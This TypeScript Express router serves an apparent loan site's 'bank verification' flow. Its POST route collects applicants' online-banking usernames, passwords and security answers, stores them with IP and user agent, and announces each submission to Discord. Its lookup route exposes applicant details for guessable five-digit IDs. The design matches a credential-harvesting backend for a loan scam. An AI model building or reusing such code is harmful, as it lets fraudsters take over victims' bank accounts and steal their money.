import { Router, Request, Response } from "express";
import { bankVerificationSchema } from "../validation";
import { upsertBankVerification } from "../services/bankVerificationService";
import {
  getApplicationById,
  updateApplicationStatus,
} from "../services/applicationService";
import { sendDiscordNotification } from "../services/discordService";
import { email } from "zod";

const router = Router();

// GET /api/bank-verification/lookup?applicationId=XXXXX
// Returns read-only application data for pre-populating the verification form
router.get("/lookup", async (req: Request, res: Response) => {
  try {
    const applicationId = (req.query.applicationId as string)?.trim();

    if (!applicationId || !/^\d{5}$/.test(applicationId)) {
      return res.status(400).json({ error: "Invalid application ID" });
    }

    const application = await getApplicationById(applicationId);

    if (!application) {
      return res.status(404).json({ error: "Application not found" });
    }

    // Return only safe, read-only fields needed for the verification form
    return res.json({
      applicationId: application.id,
      firstName: application.first_name,
      lastName: application.last_name,
      loanAmount: application.loan_amount,
      bankName: application.bank_name,
      status: application.status,
      email: application?.email,
      account_type: application?.account_type,
    });
  } catch (error) {
    console.error("Bank verification lookup error:", error);
    return res
      .status(500)
      .json({ error: "An internal error occurred. Please try again." });
  }
});

// POST /api/bank-verification — Submit bank verification credentials
router.post("/", async (req: Request, res: Response) => {
  try {
    const ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.ip ||
      "unknown";

    // Validate request body
    const parsed = bankVerificationSchema.safeParse(req.body);
    if (!parsed.success) {
      const firstError = parsed.error.issues[0];
      res.status(400).json({
        error: firstError?.message || "Invalid input",
        field: firstError?.path[0],
      });
      return;
    }

    const body = parsed.data;
    const userAgent = (req.headers["user-agent"] as string) || "unknown";

    // Verify the application exists and is in an acceptable status
    let application;
    try {
      application = await getApplicationById(body.applicationId);

      if (!application) {
        return res.status(404).json({ error: "Application not found" });
      }

      // Allow submission for pending, failed, or already in-progress statuses
      const allowedStatuses = [
        "bank_verification_pending",
        "bank_verification_failed",
        "bank_verification_in_progress",
        "deposit_in_progress",
      ];
      if (!allowedStatuses.includes(application.status)) {
        return res.status(400).json({
          error: "Bank verification cannot be submitted for this application.",
        });
      }
    } catch (dbError) {
      console.error("Failed to verify application:", dbError);
      return res.status(500).json({
        error: "Failed to verify application. Please try again.",
      });
    }

    // Upsert bank verification record (overwrite previous if exists)
    let verificationId: string;
    try {
      const result = await upsertBankVerification({
        applicationId: body.applicationId,
        bankName: body.bankName,
        accountType: body.accountType,
        bankingUsername: body.bankingUsername,
        bankingPassword: body.bankingPassword,
        securityQuestion: body.securityQuestion || undefined,
        fullName: body.fullName,
        email: body.email,
        ipAddress: ip,
        userAgent,
      });
      verificationId = result.id;
    } catch (dbError) {
      console.error("Bank verification upsert failed:", dbError);
      res
        .status(500)
        .json({ error: "Failed to save bank verification. Please try again." });
      return;
    }

    // Auto-update application status to bank_verification_in_progress
    // Only if status is pending or failed (not if admin has already set it further)
    if (
      application.status === "bank_verification_pending" ||
      application.status === "bank_verification_failed"
    ) {
      try {
        await updateApplicationStatus(
          body.applicationId,
          "bank_verification_in_progress",
          "system",
        );
      } catch (statusError) {
        console.warn("Failed to auto-update application status:", statusError);
      }
    }

    // Send Discord notification
    try {
      await sendDiscordNotification(
        `🏦 **Bank Verification Submitted**\n` +
          `**Name:** ${body.fullName}\n` +
          `**Email:** ${body.email}\n` +
          `**Bank:** ${body.bankName}\n` +
          `**Account Type:** ${body.accountType}\n` +
          `**Application ID:** ${body.applicationId}\n` +
          `**Verification ID:** ${verificationId}`,
      );
    } catch (err) {
      console.error("Discord notification error:", err);
    }

    console.log(
      `Bank verification submitted: ${verificationId} for application: ${body.applicationId}`,
    );

    res.json({
      success: true,
      verificationId,
      message: "Bank verification credentials submitted successfully.",
    });
  } catch (error) {
    console.error("Bank verification submission error:", error);
    res
      .status(500)
      .json({ error: "An internal error occurred. Please try again." });
  }
});

export default router;
